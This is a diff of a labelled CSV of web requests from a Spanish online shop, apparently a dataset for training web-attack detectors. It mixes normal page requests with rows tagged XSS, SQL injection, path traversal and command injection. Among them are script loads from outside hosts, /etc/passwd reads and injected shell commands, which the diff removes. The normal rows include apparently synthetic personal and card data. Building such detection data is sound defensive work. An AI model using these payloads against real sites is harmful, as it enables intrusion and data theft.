 "<xml src=""httP://ha.ckers.org/xsstest.xml"" id=i></xml><span datasrc=#i datafld=c dataformatas=html></span>",xss
-a;/usr/bin/id;,command_injection
 miembros/imagenes/zarauz.jpg,normal
 </plaintext\></|\><plaintext/onmouseover=prompt(1),xss
 "<SCRIPT/XSS SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
@@ -6104,7 +6062,6 @@ publico/autenticar.jsp?modo=entrar&login=daphne&pwd=desvanecido&remember=off&B1=
 miembros/imagenes/castro.jpg,normal
 ../{FILE},traversal
 publico/registro.jsp?modo=registro&login=omura5&password=cont5975614s74&nombre=Amelia&apellidos=Tolosa+Fontanet&email=boa4%40sitienesunawebtienesunnegocio.es&dni=00947908D&direccion=Calle+Arenys+De+Mar%2C+113%2C+&ciudad=Maials&cp=11690&provincia=Le%F3n&ntc=7627570556544379&B1=Registrar,normal
-a);id|,command_injection
 global/creditos.jsp,normal
 imagenes/2.gif,normal
 %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64,traversal
@@ -6156,7 +6113,6 @@ publico/miembros.jsp,normal
 "<IMG SRC=x onseeking=""alert(String.fromCharCode(88,83,83))"">",xss
 ././.htaccess,traversal
 "s&1UE: select * from users where id='1' ||1 union select 1,banner from v$version where rownum=1 -- 1'",sqli
-;system('id'),command_injection
 global/titulo.jsp,normal
 publico/miembros.jsp,normal
 publico/autenticar.jsp?modo=entrar&login=thibaud79&pwd=r393lin3nte&remember=on&B1=Entrar,normal
@@ -6170,7 +6126,6 @@ PRINT,sqli
 miembros/salir.jsp,normal
 x' OR full_name LIKE '%Bob%,sqli
 "<BODY ONLOAD=alert(""XSS"")>",xss
-|id;,command_injection
 <STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>,xss
 "0\""autofocus/onfocus=alert(1)--><video/poster/onerror=prompt(2)>""-confirm(3)-""",xss
 "<a href=""\xE2\x80\x85javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
@@ -6432,7 +6387,6 @@ publico/carrito.jsp,normal
 %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE},traversal
 "<img \x00src=x onerror=""alert(1)"">",xss
 publico/miembros.jsp,normal
-a);/usr/bin/id;,command_injection
 index.jsp,normal
 imagenes/cmenbul.gif,normal
 imagenes/1.gif,normal
@@ -6518,7 +6472,6 @@ global/creditos.jsp,normal
 publico/pagar.jsp?modo=insertar&precio=4092&B1=Pasar+por+caja,normal
 """><script>alert('XSS')</script>",xss
 "&lt;A HREF=\""//www&#46;google&#46;com/\""&gt;XSS&lt;/A&gt;",xss
-%0Aid%0A,command_injection
 "<BR SIZE=""&{alert('XSS')}"">",xss
 "insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123'))",sqli
 publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=100&cantidad=47&B1=A%F1adir+al+carrito,normal
@@ -6884,7 +6837,6 @@ publico/caracteristicas.jsp?id=1,normal
 %c0%2e%c0%2e/%c0%2e%c0%2e/{FILE},traversal
 "<IMG SRC=""livescript:[code]"">",xss
 "<IMG onmouseover=""alert('xxs')"">",xss
-%0a ping -i 30 127.0.0.1 %0a,command_injection
 imagenes/nuestratierra.jpg,normal
 &#60;META HTTP-EQUIV&#61;&#34;Link&#34; Content&#61;&#34;&#60;http&#58;&#47;&#47;testsite.com&#47;xss.css&#62;&#59; REL&#61;stylesheet&#34;&#62;,xss
 miembros/fotos.jsp,normal
@@ -7121,7 +7073,6 @@ imagenes/nuestratierra.jpg,normal
 publico/carrito.jsp,normal
 " <OBJECT TYPE=""text/x-scriptlet"" DATA=""http://ha.ckers.org/scriptlet.html""></OBJECT>",xss
 ' AND 1=utl_inaddr.get_host_address((SELECT SYS.DATABASE_NAME FROM DUAL)) AND 'i'='i,sqli
-;|/usr/bin/id|,command_injection
 imagenes/3.gif,normal
 "ABC<div style=""x:exp\x5Cression(javascript:alert(1)"">DEF",xss
 miembros/imagenes/ogono.jpg,normal
@@ -7167,7 +7118,6 @@ miembros/imagenes/castro.jpg,normal
 global/creditos.jsp,normal
 "&o.UE: select * from users where id=1 or \<\. union select 1,@@VERSION -- 1",sqli
 imagenes/cmenbul.gif,normal
-;system('/usr/bin/id'),command_injection
 publico/vaciar.jsp?B2=Vaciar+carrito,normal
 "<a href=""javascript:void(0)"" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>",xss
 miembros/salir.jsp,normal
@@ -7269,7 +7219,6 @@ miembros/index.jsp,normal
 index.jsp,normal
 <script language='javascript' src='%(jscript)s'></script>,xss
 "<xml id=""xss"" src=""%(htc)s""></xml> <label dataformatas=""html"" datasrc=""#xss"" datafld=""payload""></label>",xss
-$;/usr/bin/id,command_injection
 miembros/fotos.jsp,normal
 ..%5c..%5c..%5c..%5c..%5c..%5c{FILE},traversal
 %%32%65%%32%65%%32%66%%32%65%%36%38%%37%34%%36%31%%36%33%%36%33%%36%35%%37%33%%37%33,traversal
@@ -7325,7 +7274,6 @@ global/titulo.jsp,normal
 global/menum.jsp,normal
 publico/caracteristicas.jsp?id=1,normal
 publico/productos.jsp,normal
-|usr/bin/id\n,command_injection
 "<;STYLE>;.XSS{background-image:url("";javascript:alert(';XSS';)"";);}<;/STYLE>;<;A CLASS=XSS>;<;/A>;",xss
 publico/vaciar.jsp?B2=Vaciar+carrito,normal
 publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
@@ -7335,7 +7283,6 @@ miembros/fotos.jsp,normal
 """<img src=""""blah>"""" onmouseover=""""document.write(""""XSS-XSS-XSS"""");"""">""",xss
 publico/caracteristicas.jsp?id=2,normal
 "<script a=`>` SRC=""http://www.securitycompass.com/xss.js""></script>",xss
-|id|,command_injection
 %%32%65%%32%65/%%32%65%%32%65/{FILE},traversal
 imagenes/2.gif,normal
 <sVg><scRipt >alert&lpar;1&rpar; {Opera},xss
@@ -7407,7 +7354,6 @@ miembros/salir.jsp,normal
 %c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\{FILE},traversal
 miembros/salir.jsp,normal
 """<LINK REL=""""stylesheet"""" HREF=""""http://ha.ckers.org/xss.css"""">""",xss
-&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;,command_injection
 imagenes/3.gif,normal
 "<IMG SRC=x onclick=""alert(String.fromCharCode(88,83,83))"">",xss
 &lt;IMG SRC=JaVaScRiPt:alert(&apos;XSS&apos;)&gt;,xss
@@ -7739,7 +7685,6 @@ publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
 "' union (select NULL, NULL, NULL,  (select @@version)) --",sqli
 miembros/salir.jsp,normal
 publico/miembros.jsp,normal
-`id`,command_injection
 miembros/fotos.jsp,normal
 miembros/imagenes/ogono.jpg,normal
 publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
@@ -7752,7 +7697,6 @@ imagenes/1.gif,normal
 publico/carrito.jsp,normal
 imagenes/2.gif,normal
 %c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c{FILE},traversal
-& id,command_injection
 "<IMG SRC=x onselect=""alert(String.fromCharCode(88,83,83))"">",xss
 miembros/imagenes/ogono.jpg,normal
 publico/autenticar.jsp?modo=entrar&login=jaquith&pwd=pApAndUJo&remember=off&B1=Entrar,normal
@@ -7764,7 +7708,6 @@ imagenes/logo.gif,normal
 imagenes/2.gif,normal
 publico/miembros.jsp,normal
 "<a href=""\xE2\x80\x87javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
-a)|id,command_injection
 imagenes/nuestratierra.jpg,normal
 miembros/editar.jsp?modo=registro&login=poseidon6&password=pasote&nombre=Braian&apellidos=Porro&email=kristl%40voragolive.vn&dni=20061667D&direccion=C%2F+Torre+De+Romo+S%2FN+1F&ciudad=Gines&cp=21700&provincia=Alicante&ntc=1819477389412406&B1=Registrar,normal
 index.jsp,normal
@@ -7962,7 +7905,6 @@ miembros/editar.jsp?modo=registro&login=brana&password=f5-c21s7&nombre=Abd%F3n&a
 imagenes/logo.gif,normal
 <;IMG SRC=&;#x6A&;#x61&;#x76&;#x61&;#x73&;#x63&;#x72&;#x69&;#x70&;#x74&;#x3A&;#x61&;#x6C&;#x65&;#x72&;#x74&;#x28&;#x27&;#x58&;#x53&;#x53&;#x27&;#x29>;,xss
 "<script>if(""x\\xE1\x96\x89"".length==2) { javascript:alert(1);}</script>",xss
-%0Acat%20/etc/passwd,command_injection
 &#x00003c,xss
 &#X000003C;,xss
 miembros/editar.jsp?modo=registro&login=kunkel&password=modorrillo&nombre=Casiodoro&apellidos=Marqu%E9s&email=wincott_remeck%40enformetera.com.sc&dni=51975226X&direccion=Pi+y+Margall+17%2C+7%3FF&ciudad=Barbalos&cp=18300&provincia=Teruel&ntc=8912004350396189&B1=Registrar,normal
@@ -7972,7 +7914,6 @@ imagenes/1.gif,normal
 "<form><button formaction=""javascript:javascript:alert(1)"">X",xss
 global/creditos.jsp,normal
 "<IMG SRC=""javascript:alert('XSS');"">",xss
-%0A/usr/bin/id,command_injection
 miembros/salir.jsp,normal
 miembros/index.jsp,normal
 """><h1><IFRAME SRC=""javascript:alert('XSS');""></IFRAME>"">123</h1>",xss
@@ -8238,7 +8179,6 @@ imagenes/2.gif,normal
 <;!--[if gte IE 4]>;           ,xss
 """'`>ABC<div style=""font-family:'foo'\x3Bx:expression(javascript:alert(1);/*';"">DEF ",xss
 publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=100&cantidad=39&B1=A%F1adir+al+carrito,normal
-a|/usr/bin/id,command_injection
 publico/registro.jsp?modo=registro&login=warrello2&password=0260l6st116&nombre=Piedad&apellidos=Sevilla+Subauste&email=marchard%40mailboxrussia.kw&dni=85125612J&direccion=C%2F+Guardia+Civil%2C+90%2C+&ciudad=Estamariu&cp=14240&provincia=Almer%EDa&ntc=7024918540973284&B1=Registrar,normal
 "&lt;SCRIPT/XSS SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;js\""&gt;&lt;/SCRIPT&gt;",xss
 ..%2f..%2f..%2f{FILE},traversal
@@ -8336,7 +8276,6 @@ global/titulo.jsp,normal
 publico/anadir.jsp?id=2&nombre=Vino+Rioja&precio=100&cantidad=3&B1=A%F1adir+al+carrito,normal
 global/titulo.jsp,normal
 "s?UEf: select * from users where id=1 or 1#""? union select version(),version() -- 1",sqli
-a;id;,command_injection
 o(n)&: select * from users where id=1 %($) or 1=1 -- 1,sqli
 publico/registro.jsp?modo=registro&login=printers&password=usufrut*uar&nombre=Elido&apellidos=Valdiviezo+Montull&email=bleifer%40muchacha.com.bh&dni=59952544P&direccion=C%2F+Mare+De+Deu+De+La+Merce%2C+S%2FN%2C+8-E&ciudad=Pinilla+de+los+Barruecos&cp=07150&provincia=Girona&ntc=3755385437912895&B1=Registrar,normal
 "<STYLE type=""text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE>",xss
@@ -8366,7 +8305,6 @@ imagenes/nuestratierra.jpg,normal
 publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
 """exp/*<A STYLE='no\xss:noxss(""""*//*"""");xss:ex/*XSS*//*/*/pression(alert(""""XSS""""))'>""",xss
 admin' or ',sqli
-&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;,command_injection
 publico/vaciar.jsp?B2=Vaciar+carrito,normal
 miembros/fotos.jsp,normal
 miembros/salir.jsp,normal
@@ -8442,7 +8380,6 @@ perl -e &#39;print &#34;&#38;&#60;SCR&#92;0IPT&#62;alert&#40;&#34;XSS&#34;&#41;&
 miembros/fotos.jsp,normal
 imagenes/2.gif,normal
 x' AND members.email IS NULL; --,sqli
-;system('cat%20/etc/passwd'),command_injection
 %252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE},traversal
 %22;alert%28%27RVRSH3LL_XSS%29//,xss
 miembros/salir.jsp,normal
@@ -8652,7 +8589,6 @@ miembros/salir.jsp,normal
 index.jsp,normal
 """><script>alert(String.fromCharCode(66, 108, 65, 99, 75, 73, 99, 101))</script>",xss
 imagenes/1.gif,normal
-\nid;,command_injection
 "<form><iframe &#09;&#10;&#11; src=""javascript&#58;alert(1)""&#11;&#10;&#09;;>",xss
 global/creditos.jsp,normal
 global/creditos.jsp,normal
@@ -8807,7 +8743,6 @@ admin' or '1'='1'#,sqli
 "ABC<div style=""x:\x00expression(javascript:alert(1)"">DEF",xss
 "<img SRC=""javascript:document.vulnerable=true;"">",xss
 %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64,traversal
-`id`,command_injection
 %%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%35%37%%34%39%%34%65%%34%34%%34%66%%35%37%%35%33%%35%63%%37%37%%36%39%%36%65%%32%65%%36%39%%36%65%%36%39,traversal
 "&.oUE: select * from users where id=1 or \.<\ union select 1,@@VERSION -- 1",sqli
 &#x03c;,xss
@@ -8867,7 +8802,6 @@ imagenes/logo.gif,normal
 .../.../.../.../.../.../.../.../{FILE},traversal
 miembros/editar.jsp?modo=registro&login=oblak&password=08Tiro72&nombre=Brisia&apellidos=Borrachero+Muros&email=swanson%40sexl.co&dni=51734480M&direccion=C%2F+Grabador+David+Roberts+154+1-H&ciudad=San+Mart%EDn+y+Mudri%E1n&cp=01169&provincia=Burgos&ntc=8961981301450385&B1=Registrar,normal
 "</ foo=""><script>javascript:alert(1)</script>"">",xss
-; id,command_injection
 miembros/salir.jsp,normal
 "&lt;A HREF=\""http&#58;//%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D\""&gt;XSS&lt;/A&gt;",xss
 "1oUEv: select * from users where id=1 +1<@ union select null,version() -- 1",sqli
@@ -8977,7 +8911,6 @@ miembros/editar.jsp?modo=registro&login=karola5&password=conciliador&nombre=Pamp
 imagenes/2.gif,normal
 <iframe/onreadystatechange=alert(1),xss
 &lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)&gt;,xss
-a);id;,command_injection
 imagenes/2.gif,normal
 "<embed code=""http://businessinfo.co.uk/labs/xss/xss.swf"" allowscriptaccess=always>",xss
 publico/pagar.jsp?modo=insertar&precio=9824&B1=Pasar+por+caja,normal
@@ -9744,7 +9677,6 @@ miembros/editar.jsp?modo=registro&login=derbyshi&password=c2is48s0&nombre=Flori%
 imagenes/1.gif,normal
 <img src=`xx:xx`onerror=alert(1)>,xss
 "s(UEf: select * from users where id=1 or 1#""( union select version(),version() -- 1",sqli
-||/usr/bin/id|,command_injection
 global/estilos.css,normal
 "<a href=""\x0Djavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
 ..../..../{FILE},traversal
@@ -9793,7 +9725,6 @@ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 """><img src=x onerror=javascript:alert('1')>",xss
 publico/autenticar.jsp?modo=entrar&login=pelland&pwd=sedero&remember=off&B1=Entrar,normal
 &lt;A HREF=&quot;http://66.102.7.147/&quot;&gt;XSS&lt;/A&gt;,xss
-\nid\n,command_injection
 miembros/fotos.jsp,normal
 "<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script",xss
 publico/autenticar.jsp?modo=entrar&login=palidwor&pwd=jetazo&remember=on&B1=Entrar,normal
@@ -10139,7 +10070,6 @@ publico/registro.jsp?modo=registro&login=darice&password=lloros*o&nombre=Evangel
 "<a href=""\xE2\x80\xA9javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
 publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
 ..%2f..%2f..%2f..%2f{FILE},traversal
-\n/usr/bin/id;,command_injection
 miembros/index.jsp,normal
 global/creditos.jsp,normal
 publico/registro.jsp?modo=registro&login=cancela&password=es%2Bteatita&nombre=Ivana&apellidos=Pampanas+Soto&email=tomono%40esteticadayda.az&dni=98585223R&direccion=Nao+Victoria%2C+79%2C+12%3FH&ciudad=Zarzuela&cp=32633&provincia=Madrid&ntc=3891386369836978&B1=Registrar,normal
